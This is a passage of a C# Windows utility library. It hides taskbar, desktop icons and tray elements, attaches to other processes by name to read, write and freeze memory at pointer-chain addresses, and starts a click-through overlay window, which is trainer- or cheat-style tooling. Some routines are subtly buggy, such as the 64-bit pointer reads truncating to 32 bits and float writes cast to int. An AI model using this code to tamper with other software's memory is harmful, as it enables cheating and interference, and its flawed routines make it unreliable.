    [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern bool SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);



    private const int SW_HIDE = 0;
    private const int SW_SHOW = 1;


    #region Taskbar

    public static class Taskbar
    {
        private static IntPtr Handle => FindWindow("Shell_TrayWnd", null!);

        private static IntPtr HandleOfStartButton
        {
            get
            {
                IntPtr handleOfDesktop = GetDesktopWindow();
                IntPtr handleOfStartButton = FindWindowEx(handleOfDesktop, IntPtr.Zero, "button", null!);
                return handleOfStartButton;
            }
        }

        public static bool IsVisible => IsWindowVisible(Handle);

        public static void Show()
        {
            ShowWindow(Handle, SW_SHOW);
            ShowWindow(HandleOfStartButton, SW_SHOW);
        }

        public static void Hide()
        {
            ShowWindow(Handle, SW_HIDE);
            ShowWindow(HandleOfStartButton, SW_HIDE);
        }
    }

    #endregion

    #region Icons

    public static class Icons
    {
        [return: MarshalAs(UnmanagedType.Bool)]
        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool GetWindowInfo(IntPtr hwnd, ref WINDOWINFO pwi);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr GetWindow(IntPtr hWnd, GetWindow_Cmd uCmd);


        private enum GetWindow_Cmd : uint
        {
            GW_HWNDFIRST = 0,
            GW_HWNDLAST = 1,
            GW_HWNDNEXT = 2,
            GW_HWNDPREV = 3,
            GW_OWNER = 4,
            GW_CHILD = 5,
            GW_ENABLEDPOPUP = 6
        }
        [StructLayout(LayoutKind.Sequential)]
        private struct RECT
        {
            private int _Left;
            private int _Top;
            private int _Right;
            private int _Bottom;
        }
        [StructLayout(LayoutKind.Sequential)]
        private struct WINDOWINFO
        {
            public uint cbSize;
            public RECT rcWindow;
            public RECT rcClient;
            public uint dwStyle;
            public uint dwExStyle;
            public uint dwWindowStatus;
            public uint cxWindowBorders;
            public uint cyWindowBorders;
            public ushort atomWindowType;
            public ushort wCreatorVersion;

            public WINDOWINFO(Boolean? filler) : this()
            {
                cbSize = (UInt32)(Marshal.SizeOf(typeof(WINDOWINFO)));
            }

        }
        private const int WM_COMMAND = 0x111;

        private static IntPtr GetDesktopSHELLDLL_DefView()
        {
            var hShellViewWin = IntPtr.Zero;
            var hWorkerW = IntPtr.Zero;

            var hProgman = FindWindow("Progman", "Program Manager");
            var hDesktopWnd = GetDesktopWindow();

            if (hProgman != IntPtr.Zero)
            {
                hShellViewWin = FindWindowEx(hProgman, IntPtr.Zero, "SHELLDLL_DefView", null!);
                if (hShellViewWin == IntPtr.Zero)
                {
                    do
                    {
                        hWorkerW = FindWindowEx(hDesktopWnd, hWorkerW, "WorkerW", null!);
                        hShellViewWin = FindWindowEx(hWorkerW, IntPtr.Zero, "SHELLDLL_DefView", null!);
                    } while (hShellViewWin == IntPtr.Zero && hWorkerW != IntPtr.Zero);
                }
            }
            return hShellViewWin;
        }


        public static void Hide()
        {
            if (!IsVisible) return;

            ToggleDesktopIcons();
        }

        public static void Show()
        {
            if (IsVisible) return;

            ToggleDesktopIcons();
        }

        public static bool IsVisible
        {
            get
            {
                var hWnd = GetWindow(GetWindow(FindWindow("Progman", "Program Manager"), GetWindow_Cmd.GW_CHILD), GetWindow_Cmd.GW_CHILD);
                var info = new WINDOWINFO(null);
                GetWindowInfo(hWnd, ref info);
                return (info.dwStyle & 0x10000000) == 0x10000000;
            }
        }

        private static void ToggleDesktopIcons()
        {
            var toggleDesktopCommand = new IntPtr(0x7402);
            SendMessage(GetDesktopSHELLDLL_DefView(), WM_COMMAND, toggleDesktopCommand, IntPtr.Zero);
        }
    }

    #endregion

    #region Clock

    public static class Clock
    {
        private static IntPtr HandleOfClock
        {
            get
            {
                return FindWindowEx(
                  FindWindowEx(
                  FindWindow("Shell_TrayWnd", null!), IntPtr.Zero, "TrayNotifyWnd", null!),
              IntPtr.Zero, "TrayClockWClass", null!);
            }
        }

        public static void Hide() =>
            ShowWindow(HandleOfClock, SW_HIDE);

        public static void Show() =>
            ShowWindow(HandleOfClock, SW_SHOW);
    }

    #endregion

    #region Tray Icons

    public static class TrayIcons
    {
        private static IntPtr HandleOfTrayIcons
        {
            get
            {
                return FindWindowEx(
                    FindWindow("Shell_TrayWnd", null!),
                            IntPtr.Zero, "TrayNotifyWnd", null!);
            }
        }


        public static void Hide() =>
            ShowWindow(HandleOfTrayIcons, SW_HIDE);

        public static void Show() =>
            ShowWindow(HandleOfTrayIcons, SW_SHOW);
    }

    #endregion

    public static void Hide()
    {
        Icons.Hide();
        Taskbar.Hide();
    }

    public static void Show()
    {
        Icons.Show();
        Taskbar.Show();
    }
}

#endregion


#region => Advanced Process / Process Memory / Process Overlay

namespace BekoS
{
    #region Advanced Process

    public class AdvancedProcess : IDisposable
    {
        public bool IsExists => process is not null && !process.HasExited;

        Bit? _bits;
        public Bit? Bits => _bits ??= GetBits();

        ProcessMemory? _memory;
        public ProcessMemory Memory
        {
            get
            {
                _memory ??= new ProcessMemory(process!);

                if (IsExists) _memory.TryConnectProcess();

                return _memory;
            }
        }

        ProcessOverlay? _overlay;
        public ProcessOverlay Overlay
        {
            get
            {
                _overlay ??= new ProcessOverlay(process!, 1000);

                if (IsExists) _overlay.TryConnectProcess();

                return _overlay;
            }
        }


        #region Constructer

        private Process? process;
        public AdvancedProcess(Process process)
        {
            TryConnectIfOpen(process);
        }

        public AdvancedProcess(int processId) : this(Process.GetProcessById(processId)) { }

        private string? ctorParameterProcessName;
        public AdvancedProcess(string processName)
            : this(Process.GetProcessesByName(processName.Replace(".exe", "")).FirstOrDefault()!)
        {
            ctorParameterProcessName = processName.Replace(".exe", "");
        }

        public AdvancedProcess() : this(Process.GetCurrentProcess()) { }

        #endregion

        #region Connect / Wait For Open

        public Task<bool> WaitForOpenAsync(int interval)
        {
            if (IsExists) return Task.FromResult(true);

            string? targetName = ctorParameterProcessName ?? process?.ProcessName;
            if (targetName is null) Task.FromResult(false);

            return Task.Run(() =>
            {
                while (true)
                {
                    if (TryConnectIfOpen(targetName!)) break;
                    Thread.Sleep(interval);
                }

                return true;
            });
        }

        public bool TryConnectIfOpen()
        {
            if (IsExists) return true;

            string? targetName = ctorParameterProcessName ?? process?.ProcessName;
            if (targetName is null) return false;

            return TryConnectIfOpen(targetName);
        }

        private bool TryConnectIfOpen(string processName)
        {
            return TryConnectIfOpen(Process.GetProcessesByName(processName).FirstOrDefault());
        }

        private bool TryConnectIfOpen(Process? process)
        {
            this.process = process;
            if (!IsExists) return false;

            return true;
        }

        #endregion

        #region Bring To Front

        [DllImport("user32.dll")]
        public static extern bool SetForegroundWindow(IntPtr hWnd);

        public void BringToFront()
        {
            if (!IsExists || process!.MainWindowHandle == IntPtr.Zero) return;

            SetForegroundWindow(process.MainWindowHandle);
        }

        #endregion

        #region Kill

        public void Kill()
        {
            process?.Kill();

            process?.Dispose();
            process = null;
        }

        #endregion

        #region Dispose

        public void Dispose()
        {
            process?.Dispose();
            _memory?.Dispose();
            _overlay?.Dispose();
        }

        #endregion


        #region Utilities

        #region Process Bits

        [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool IsWow64Process([In] IntPtr process, [Out] out bool wow64Process);

        private Bit GetBits()
        {
            return (Environment.Is64BitOperatingSystem && IsWow64Process(process!.Handle, out var lpSystemInfo) && !lpSystemInfo)
                 ? Bit.Bit64
                 : Bit.Bit32;
        }

        public enum Bit
        {
            Bit64,
            Bit32
        }

        #endregion

        #endregion
    }

    #endregion

    #region Process Memory

    public class ProcessMemory : IDisposable
    {

        public bool IsConnected
        {
            get
            {
                try
                {
                    return process is not null && process.Responding && process.MainModule is not null;
                }
                catch
                {
                    return false;
                }
            }
        }


        private Process? process;
        public ProcessMemory(Process process)
        {
            if (!IsAdministrator()) throw new UnauthorizedAccessException("Need Administrator Permissions");

            TryConnectProcess(process);
        }

        public ProcessMemory(int processId) : this(Process.GetProcessById(processId)) { }

        private string? ctorParameterProcessName;
        public ProcessMemory(string processName)
            : this(Process.GetProcessesByName(processName.Replace(".exe", "")).FirstOrDefault()!)
        {
            ctorParameterProcessName = processName.Replace(".exe", "");
        }

        public ProcessMemory() : this(Process.GetCurrentProcess()) { }


        #region Connect Process

        [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool IsWow64Process([In] IntPtr process, [Out] out bool wow64Process);


        private bool isProcess64Bit;

        public Task WaitForConnectAsync(int interval)
        {
            if (IsConnected) return Task.FromResult(true);

            string? targetName = ctorParameterProcessName ?? process?.ProcessName;
            if (targetName is null) Task.FromResult(false);

            return Task.Run(() =>
            {
                while (true)
                {
                    if (TryConnectProcess(targetName!)) break;
                    Thread.Sleep(interval);
                }

                return true;
            });
        }

        public bool TryConnectProcess()
        {
            if (IsConnected) return true;

            string? targetName = ctorParameterProcessName ?? process?.ProcessName;
            if (targetName is null) return false;

            return TryConnectProcess(targetName);
        }

        private bool TryConnectProcess(string processName)
        {
            processName = processName.Replace(".exe", "");

            return TryConnectProcess(Process.GetProcessesByName(processName).FirstOrDefault()!);
        }

        private bool TryConnectProcess(Process process)
        {
            this.process = process;
            if (!IsConnected) return false;

            isProcess64Bit = Environment.Is64BitOperatingSystem && IsWow64Process(process!.Handle, out var lpSystemInfo) && !lpSystemInfo;

            return true;
        }

        #endregion


        #region Read

        public T? Read<T>(string address, bool isOffsetsHexdecimal = true)
        {
            if (!ReaderHelper(address, isOffsetsHexdecimal, out UIntPtr organizedAddress))
                return default;

            return ReadAddress<T>(process!, organizedAddress);
        }

        public byte[]? ReadBytes(string address, int length, bool isOffsetsHexdecimal = true)
        {
            if (!ReaderHelper(address, isOffsetsHexdecimal, out UIntPtr organizedAddress))
                return default;

            return ReadBytesAddress(process!, organizedAddress, length);
        }

        public string? ReadString(string address, int bytesLength, bool isOffsetsHexdecimal = true, bool zeroTerminated = true, Encoding encoding = null!)
        {
            if (!ReaderHelper(address, isOffsetsHexdecimal, out UIntPtr organizedAddress))
                return null;

            encoding ??= Encoding.UTF8;

            return ReadStringAddress(process!, organizedAddress, bytesLength, zeroTerminated, encoding);
        }

        public UIntPtr ReadPointer(string address, bool isOffsetsHexdecimal = true)
        {
            if (!ReaderHelper(address, isOffsetsHexdecimal, out UIntPtr organizedAddress))
                return UIntPtr.Zero;

            return ReadPointerAddress(process!, isProcess64Bit, organizedAddress);
        }

        private bool ReaderHelper(string address, bool isOffsetsHexdecimal, out UIntPtr organizedAddress)
        {
            organizedAddress = UIntPtr.Zero;

            if (!IsConnected) return false;

            address = address.Replace(" ", "");

            if (string.IsNullOrEmpty(address)) return false;

            organizedAddress = GetAddress(process!, isProcess64Bit, address, isOffsetsHexdecimal);
            if (organizedAddress == UIntPtr.Zero || organizedAddress.ToUInt64() < 65536) return false;

            return true;
        }

        #endregion

        #region Subscribe

        private ConcurrentDictionary<UIntPtr, CancellationTokenSource> BindTokens = new ConcurrentDictionary<UIntPtr, CancellationTokenSource>();

        public bool Subscribe<T>(string address, Action<T?> action, int interval, bool isOffsetsHexdecimal = true)
        {
            if (!SubscribeHelper(address, action, isOffsetsHexdecimal, out UIntPtr organizedAddress, out CancellationTokenSource? cts))
                return false;


            Task.Factory.StartNew(() =>
            {
                while (!cts!.Token.IsCancellationRequested)
                {
                    if (!IsConnected)
                    {
                        try
                        {
                            lock (BindTokens)
                            {
                                BindTokens[organizedAddress].Cancel();
                                BindTokens.TryRemove(organizedAddress, out var _);
                            }
                        }
                        catch { }
                        return;
                    }

                    T? value = ReadAddress<T>(process!, organizedAddress);
                    action(value);
                    Thread.Sleep(interval);
                }
            },
            cts!.Token);

            return true;
        }

        public bool SubscribeBytes(string address, int length, Action<byte[]?> action, int interval, bool isOffsetsHexdecimal = true)
        {
            if (!SubscribeHelper(address, action, isOffsetsHexdecimal, out UIntPtr organizedAddress, out CancellationTokenSource? cts))
                return false;


            Task.Factory.StartNew(() =>
            {
                while (!cts!.Token.IsCancellationRequested)
                {
                    if (!IsConnected)
                    {
                        try
                        {
                            lock (BindTokens)
                            {
                                BindTokens[organizedAddress].Cancel();
                                BindTokens.TryRemove(organizedAddress, out var _);
                            }
                        }
                        catch { }
                        return;
                    }

                    byte[]? value = ReadBytesAddress(process!, organizedAddress, length);
                    action(value);
                    Thread.Sleep(interval);
                }
            },
            cts!.Token);

            return true;
        }

        public bool SubscribeString(string address, int bytesLength, Action<string?> action, int interval, bool isOffsetsHexdecimal = true, bool zeroTerminated = true, Encoding encoding = null!)
        {
            if (!SubscribeHelper(address, action, isOffsetsHexdecimal, out UIntPtr organizedAddress, out CancellationTokenSource? cts))
                return false;


            Task.Factory.StartNew(() =>
            {
                while (!cts!.Token.IsCancellationRequested)
                {
                    if (!IsConnected)
                    {
                        try
                        {
                            lock (BindTokens)
                            {
                                BindTokens[organizedAddress].Cancel();
                                BindTokens.TryRemove(organizedAddress, out var _);
                            }
                        }
                        catch { }
                        return;
                    }

                    string? value = ReadStringAddress(process!, organizedAddress, bytesLength, zeroTerminated, encoding);
                    action(value);
                    Thread.Sleep(interval);
                }
            },
            cts!.Token);

            return true;
        }

        public bool SubscribePointer(string address, Action<UIntPtr> action, int interval, bool isOffsetsHexdecimal = true)
        {
            if (!SubscribeHelper(address, action, isOffsetsHexdecimal, out UIntPtr organizedAddress, out CancellationTokenSource? cts))
                return false;


            Task.Factory.StartNew(() =>
            {
                while (!cts!.Token.IsCancellationRequested)
                {
                    if (!IsConnected)
                    {
                        try
                        {
                            lock (BindTokens)
                            {
                                BindTokens[organizedAddress].Cancel();
                                BindTokens.TryRemove(organizedAddress, out var _);
                            }
                        }
                        catch { }
                        return;
                    }

                    UIntPtr value = ReadPointerAddress(process!, isProcess64Bit, organizedAddress);
                    action(value);
                    Thread.Sleep(interval);
                }
            },
            cts!.Token);

            return true;
        }

        private bool SubscribeHelper<T>(string address, Action<T> action, bool isOffsetsHexdecimal, out UIntPtr organizedAddress, out CancellationTokenSource? cts)
        {
            organizedAddress = UIntPtr.Zero;
            cts = null;

            if (!IsConnected) return false;

            address = address.Replace(" ", "");

            if (string.IsNullOrEmpty(address) || action is null) return false;

            organizedAddress = GetAddress(process!, isProcess64Bit, address, isOffsetsHexdecimal);
            if (organizedAddress == UIntPtr.Zero || organizedAddress.ToUInt64() < 65536) return false;


            if (BindTokens.ContainsKey(organizedAddress)) return true;
            cts = new CancellationTokenSource();
            BindTokens.TryAdd(organizedAddress, cts);

            return true;
        }

        #endregion

        #region Unsubscribe

        public bool Unsubscribe(string address, bool isOffsetsHexdecimal = true)
        {
            if (!IsConnected) return false;

            address = address.Replace(" ", "");

            if (string.IsNullOrEmpty(address)) return false;

            UIntPtr organizedAddress = GetAddress(process!, isProcess64Bit, address, isOffsetsHexdecimal);
            if (organizedAddress == UIntPtr.Zero || organizedAddress.ToUInt64() < 65536) return false;

            try
            {
                lock (BindTokens)
                {
                    BindTokens[organizedAddress].Cancel();
                    BindTokens.TryRemove(organizedAddress, out var _);
                }
            }
            catch { }

            return true;
        }


        #endregion

        #region Write

        public bool Write<T>(string address, T value, bool isOffsetsHexdecimal = true)
        {
            if (!IsConnected) return false;

            address = address.Replace(" ", "");

            if (string.IsNullOrEmpty(address) || value is null) return false;

            UIntPtr organizedAddress = GetAddress(process!, isProcess64Bit, address, isOffsetsHexdecimal);
            if (organizedAddress == UIntPtr.Zero || organizedAddress.ToUInt64() < 65536) return false;

            return WriteToAddress(process!, organizedAddress, value);
        }

        #endregion

        #region Freeze

        private ConcurrentDictionary<UIntPtr, CancellationTokenSource> FreezeTokens = new ConcurrentDictionary<UIntPtr, CancellationTokenSource>();

        public bool Freeze<T>(string address, T value, int interval, bool isOffsetsHexdecimal = true)
        {
            if (!FreezeHelper(address, value, isOffsetsHexdecimal, out UIntPtr organizedAddress, out CancellationTokenSource? cts))
                return false;


            Task.Factory.StartNew(() =>
            {
                while (!cts!.Token.IsCancellationRequested)
                {
                    if (!IsConnected)
                    {
                        try
                        {
                            lock (FreezeTokens)
                            {
                                FreezeTokens[organizedAddress].Cancel();
                                FreezeTokens.TryRemove(organizedAddress, out var _);
                            }
                        }
                        catch { }
                        return;
                    }

                    WriteToAddress(process!, organizedAddress, value);
                    Thread.Sleep(interval);
                }
            },
            cts!.Token);

            return true;
        }

        private bool FreezeHelper<T>(string address, T value, bool isOffsetsHexdecimal, out UIntPtr organizedAddress, out CancellationTokenSource? cts)
        {
            organizedAddress = UIntPtr.Zero;
            cts = null;

            if (!IsConnected) return false;

            address = address.Replace(" ", "");

            if (string.IsNullOrEmpty(address) || value is null) return false;

            organizedAddress = GetAddress(process!, isProcess64Bit, address, isOffsetsHexdecimal);
            if (organizedAddress == UIntPtr.Zero || organizedAddress.ToUInt64() < 65536) return false;


            if (FreezeTokens.ContainsKey(organizedAddress)) return true;
            cts = new CancellationTokenSource();
            FreezeTokens.TryAdd(organizedAddress, cts);

            return true;
        }

        #endregion

        #region Unfreeze

        public bool Unfreeze(string address, bool isOffsetsHexdecimal = true)
        {
            if (!IsConnected) return false;

            address = address.Replace(" ", "");

            if (string.IsNullOrEmpty(address)) return false;

            UIntPtr organizedAddress = GetAddress(process!, isProcess64Bit, address, isOffsetsHexdecimal);
            if (organizedAddress == UIntPtr.Zero || organizedAddress.ToUInt64() < 65536) return false;

            try
            {
                lock (FreezeTokens)
                {
                    FreezeTokens[organizedAddress].Cancel();
                    FreezeTokens.TryRemove(organizedAddress, out var _);
                }
            }
            catch { }

            return true;
        }

        #endregion

        #region Dispose

        public void Dispose()
        {
            process?.Dispose();
        }

        #endregion


        #region Utilities

        #region Read Address

        [DllImport("kernel32.dll")]
        public static extern bool ReadProcessMemory(IntPtr hProcess, UIntPtr lpBaseAddress, [Out] byte[] lpBuffer, UIntPtr nSize, IntPtr lpNumberOfBytesRead);

        private static byte[]? ReadBytesAddress(Process process, UIntPtr address, int length)
        {
            byte[] data = new byte[length];
            if (ReadProcessMemory(process.Handle, address, data, (UIntPtr)length, IntPtr.Zero))
            {
                return data;
            }

            return null;
        }

        private static string? ReadStringAddress(Process process, UIntPtr address, int length, bool zeroTerminated, Encoding encoding)
        {
            byte[] data = new byte[length];
            if (ReadProcessMemory(process.Handle, address, data, (UIntPtr)length, IntPtr.Zero))
            {
                return
                    zeroTerminated
                    ? encoding.GetString(data).Split(default(char))[0]
                    : encoding.GetString(data);
            }

            return null;
        }

        private static UIntPtr ReadPointerAddress(Process process, bool is64Bit, UIntPtr address)
        {
            int byteSize = is64Bit ? 16 : 8;

            byte[] data = new byte[byteSize];
            if (ReadProcessMemory(process.Handle, address, data, (UIntPtr)byteSize, IntPtr.Zero))
            {
                return (UIntPtr)BitConverter.ToUInt32(data, 0);
            }

            return UIntPtr.Zero;
        }

        private static T? ReadAddress<T>(Process process, UIntPtr address)
        {
            Type type = typeof(T);

            // Byte
            if (type == typeof(byte))
            {
                int byteSize = 1;

                byte[] data = new byte[byteSize];
                if (ReadProcessMemory(process.Handle, address, data, (UIntPtr)1uL, IntPtr.Zero))
                {
                    object obj = data[0];
                    return (T?)Convert.ChangeType(obj, typeof(T?));
                }

                return default;
            }

            // int
            else if (type == typeof(int))
            {
                int byteSize = 4;

                byte[] data = new byte[byteSize];
                if (ReadProcessMemory(process.Handle, address, data, (UIntPtr)4uL, IntPtr.Zero))
                {
                    object obj = BitConverter.ToInt32(data, 0);
                    return (T?)Convert.ChangeType(obj, typeof(T?));
                }

                return default;
            }

            // long
            else if (type == typeof(long))
            {
                int byteSize = 8;

                byte[] data = new byte[byteSize];
                if (ReadProcessMemory(process.Handle, address, data, (UIntPtr)8uL, IntPtr.Zero))
                {
                    object obj = BitConverter.ToInt64(data, 0);
                    return (T?)Convert.ChangeType(obj, typeof(T?));
                }

                return default;
            }

            // float
            else if (type == typeof(float))
            {
                int byteSize = 4;

                byte[] data = new byte[byteSize];
                if (ReadProcessMemory(process.Handle, address, data, (UIntPtr)4uL, IntPtr.Zero))
                {
                    object obj = BitConverter.ToSingle(data, 0);
                    return (T?)Convert.ChangeType(obj, typeof(T?));
                }

                return default;
            }

            // double
            else if (type == typeof(double))
            {
                int byteSize = 8;

                byte[] data = new byte[byteSize];
                if (ReadProcessMemory(process.Handle, address, data, (UIntPtr)8uL, IntPtr.Zero))
                {
                    object obj = BitConverter.ToDouble(data, 0);
                    return (T?)Convert.ChangeType(obj, typeof(T?));
                }

                return default;
            }

            // bool
            else if (type == typeof(bool))
            {
                int byteSize = 1;

                byte[] data = new byte[byteSize];
                if (ReadProcessMemory(process.Handle, address, data, (UIntPtr)4uL, IntPtr.Zero))
                {
                    object obj = Convert.ToBoolean(data[0]);
                    return (T?)Convert.ChangeType(obj, typeof(T?));
                }

                return default;
            }

            else return default;
        }

        #endregion

        #region Write To Address

        [DllImport("kernel32.dll")]
        private static extern bool WriteProcessMemory(IntPtr hProcess, UIntPtr lpBaseAddress, byte[] lpBuffer, UIntPtr nSize, IntPtr lpNumberOfBytesWritten);


        private static bool WriteToAddress<T>(Process process, UIntPtr address, T value)
        {
            Type type = typeof(T);
            byte[]? data;

            // Byte
            if (type == typeof(byte))
            {
                var newValue = (byte)Convert.ChangeType(value, type)!;

                data = new byte[1] { newValue };
            }

            // Short
            else if (type == typeof(short))
            {
                var newValue = (short)Convert.ChangeType(value, type)!;

                data = BitConverter.GetBytes(newValue);
            }

            // int
            else if (type == typeof(int))
            {
                var newValue = (int)Convert.ChangeType(value, type)!;

                data = BitConverter.GetBytes(newValue);
            }

            // float
            else if (type == typeof(float))
            {
                var newValue = (int)Convert.ChangeType(value, type)!;

                data = BitConverter.GetBytes(newValue);
            }

            // long
            else if (type == typeof(long))
            {
                var newValue = (long)Convert.ChangeType(value, type)!;

                data = BitConverter.GetBytes(newValue);
            }

            // double
            else if (type == typeof(double))
            {
                var newValue = (double)Convert.ChangeType(value, type)!;

                data = BitConverter.GetBytes(newValue);
            }

            // string
            else if (type == typeof(string))
            {
                var newValue = (string)Convert.ChangeType(value, type)!;

                data = Encoding.UTF8.GetBytes(newValue);
            }

            else return false;

            return WriteProcessMemory(process!.Handle, address, data, (UIntPtr)(ulong)data.Length, IntPtr.Zero);
        }

        #endregion

        #region Get Address

        private static UIntPtr GetAddress(Process process, bool is64Bit, string code, bool isOffsetsHexdecimal)
        {
            // Return If Basic Address
            if (!code.Contains('+') && !code.Contains(',')) return GetBaseAddress(process, code, isOffsetsHexdecimal);

            // Split Code
            string baseAddress;
            string[]? offsets;
            string[] splittedCode = code.Split(new char[] { ',' }, 2);
            if (splittedCode.Length == 1)
            {
                baseAddress = code;
                offsets = null;
            }
            else
            {
                baseAddress = splittedCode[0];
                offsets = splittedCode[1].Split(',');
            }

            // Get Base Address
            UIntPtr baseAddressPtr;
            string[] splittedBaseAddress = baseAddress.Split(new char[] { '+' }, 2);
            if (splittedBaseAddress.Length == 1)
            {
                baseAddressPtr = GetBaseAddress(process, baseAddress, isOffsetsHexdecimal);
            }
            else
            {
                try
                {
                    baseAddressPtr = UIntPtr.Add
                        (
                            GetBaseAddress(process, splittedBaseAddress[0], isOffsetsHexdecimal),

                            isOffsetsHexdecimal
                            ? Convert.ToInt32(splittedBaseAddress[1], 16)
                            : Int32.Parse(splittedBaseAddress[1])
                        );
                }
                catch
                {
                    return UIntPtr.Zero;
                }
            }

            // If No Offsets Found
            if (offsets is null) return baseAddressPtr;

            // Convert Offsets
            var offsetArray = offsets?.Select(offset =>
            {
                if (!isOffsetsHexdecimal) return Int32.Parse(offset);

                int organizedOffset = Convert.ToInt32(offset.Replace("-", ""), 16);
                if (offset.Contains("-")) organizedOffset *= -1;

                return organizedOffset;
            }
            ).ToArray();

            // Get First Address
            ulong size = is64Bit ? 16uL : 8uL;
            byte[] data = new byte[size];

            ReadProcessMemory
            (
            process!.Handle,
            baseAddressPtr,
            data,
            (UIntPtr)size,
            IntPtr.Zero
            );

            uint pointedAddress = BitConverter.ToUInt32(data, 0);

            UIntPtr uIntPtr = (UIntPtr)0uL;
            for (int i = 0; i < offsetArray!.Length; i++)
            {
                uIntPtr = new UIntPtr(Convert.ToUInt32(pointedAddress + offsetArray[i]));

                ReadProcessMemory
                    (process!.Handle,
                    uIntPtr,
                    data,
                    (UIntPtr)size,
                    IntPtr.Zero);

                pointedAddress = BitConverter.ToUInt32(data, 0);
            }

            return uIntPtr;
        }

        private static UIntPtr GetBaseAddress(Process process, string code, bool isHexdecimal)
        {
            string codeLowered = code.ToLower();

            // If Only Module
            if (codeLowered.EndsWith(".exe") || codeLowered.EndsWith(".dll") || codeLowered.EndsWith(".bin"))
            {
                return (UIntPtr)(long)GetModuleAddressByName(process, code);
            }

            // If Main Or Base
            if (codeLowered == "main" || codeLowered == "base")
            {
                return (UIntPtr)(ulong)process!.MainModule!.BaseAddress;
            }

            // If Only Hexdecimal
            try
            {
                return
                    isHexdecimal
                    ? new UIntPtr(Convert.ToUInt64(code, 16))
                    : (UIntPtr)UInt32.Parse(code);
            }
            catch
            {
                return UIntPtr.Zero;
            }
        }

        #endregion

        #region Is Administrator

        private static bool IsAdministrator()
        {
            try
            {
                WindowsIdentity user = WindowsIdentity.GetCurrent();
                WindowsPrincipal principal = new WindowsPrincipal(user);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch { }

            return false;
        }

        #endregion

        #region Get Module Address By Name

        [DllImport("kernel32.dll")]
        static extern bool Module32First(IntPtr hSnapshot, ref MODULEENTRY32 lpme);

        [DllImport("kernel32.dll")]
        static extern bool Module32Next(IntPtr hSnapshot, ref MODULEENTRY32 lpme);

        [DllImport("kernel32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CloseHandle([In] IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateToolhelp32Snapshot(SnapshotFlags dwFlags, IntPtr th32ProcessID);


        const Int64 INVALID_HANDLE_VALUE = -1;
        [Flags]

        private enum SnapshotFlags : uint
        {
            HeapList = 0x00000001,
            Process = 0x00000002,
            Thread = 0x00000004,
            Module = 0x00000008,
            Module32 = 0x00000010,
            Inherit = 0x80000000,
            All = 0x0000001F,
            NoHeaps = 0x40000000
        }

        [StructLayout(LayoutKind.Sequential, CharSet = System.Runtime.InteropServices.CharSet.Ansi)]
        public struct MODULEENTRY32
        {
            internal uint dwSize;
            internal uint th32ModuleID;
            internal uint th32ProcessID;
            internal uint GlblcntUsage;
            internal uint ProccntUsage;
            internal IntPtr modBaseAddr;
            internal uint modBaseSize;
            internal IntPtr hModule;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
            internal string szModule;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
            internal string szExePath;
        }


        public static IntPtr GetModuleAddressByName(Process process, string moduleName)
        {
            IntPtr procId = (IntPtr)process.Id;
            IntPtr modBaseAddr = IntPtr.Zero;
            IntPtr hSnap = CreateToolhelp32Snapshot(SnapshotFlags.Module | SnapshotFlags.Module32, procId);

            if (hSnap.ToInt64() != INVALID_HANDLE_VALUE)
            {
                MODULEENTRY32 modEntry = new MODULEENTRY32();
                modEntry.dwSize = (uint)Marshal.SizeOf(typeof(MODULEENTRY32));

                if (Module32First(hSnap, ref modEntry))
                {
                    do
                    {
                        if (modEntry.szModule.Equals(moduleName))
                        {
                            modBaseAddr = modEntry.modBaseAddr;
                            break;
                        }
                    }
                    while (Module32Next(hSnap, ref modEntry));
                }
            }
            CloseHandle(hSnap);

            return modBaseAddr;
        }

        #endregion

        #endregion
    }

    #endregion

    #region Process Overlay

    public class ProcessOverlay : IDisposable
    {
        public bool IsConnected
        {
            get
            {
                if (process is null && process!.HasExited) return false;

                GetWindowRect(window, out windowRect);

                return
                    !(
                    windowRect.Top == 0
                    && windowRect.Left == 0
                    && windowRect.Right == 0
                    && windowRect.Bottom == 0
                    );
            }
        }

        #region Constructer

        [DllImport("user32.dll", SetLastError = true)]
        static extern int GetWindowLong(IntPtr hWnd, int nIndex);

        [DllImport("user32.dll", SetLastError = true)]
        static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);


        private Form overlayForm = new Form()
        {
            BackColor = Color.Wheat,
            TransparencyKey = Color.Wheat,
            TopMost = true,
            TopLevel = true,
            FormBorderStyle = FormBorderStyle.None,
            ShowInTaskbar = false,
            Size = new Size(0, 0)
        };

        private Process? process;
        private int adjustInterval;
        public ProcessOverlay(Process process, int adjustInterval)
        {
            this.adjustInterval = adjustInterval;

            int initialStyle = GetWindowLong(overlayForm.Handle, -20);
            SetWindowLong(overlayForm.Handle, -20, initialStyle | 0x80000 | 0x20);

            TryConnectProcess(process);
        }

        public ProcessOverlay(int processId, int adjustInterval) : this(Process.GetProcessById(processId), adjustInterval) { }

        private string? ctorParameterProcessName;
        public ProcessOverlay(string processName, int adjustInterval)
            : this(
                  Process.GetProcessesByName(processName.Replace(".exe", "")).FirstOrDefault()!,
                  adjustInterval
                  )
        {
            ctorParameterProcessName = processName.Replace(".exe", "");
        }

        public ProcessOverlay(int adjustInterval) : this(Process.GetCurrentProcess(), adjustInterval) { }

        #endregion

        #region Connect / Wait For Connect

        public Task<bool> WaitForConnectAsync(int interval)
        {
            if (IsConnected) return Task.FromResult(true);

            string? targetName = ctorParameterProcessName ?? process?.ProcessName;
            if (targetName is null) Task.FromResult(false);

            return Task.Run(() =>
            {
                while (true)
                {
                    if (TryConnectProcess(targetName!)) break;
                    Thread.Sleep(interval);
                }

                return true;
            });
        }

        public bool TryConnectProcess()
        {
            if (IsConnected) return true;

            string? targetName = ctorParameterProcessName ?? process?.ProcessName;
            if (targetName is null) return false;

            return TryConnectProcess(targetName);
        }

        private bool TryConnectProcess(string processName)
